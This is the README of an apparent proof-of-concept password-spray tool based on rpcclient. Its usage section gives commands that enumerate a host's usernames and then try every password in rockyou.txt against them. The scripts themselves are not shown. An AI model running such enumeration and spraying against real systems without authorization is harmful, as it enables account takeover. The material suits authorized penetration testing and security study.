# rpc-password-spray

Proof-of-concept password spray script based on `rpcclient`

## Usage

Example below checks if any user on host with IP-address 127.0.0.1 is using a password from rockyou.txt

```
chmod 755 rpc-username-lookup.sh
./rpc-username-lookup.sh 127.0.0.1 | grep "User:" | awk '{print $1}' | sed 's/^.*\\//' > MY_USERNAMES.txt

chmod 755 rpc-password-spray.sh
./rpc-password-spray.sh 127.0.0.1 MY_USERNAMES.txt /usr/share/wordlists/rockyou.txt
```

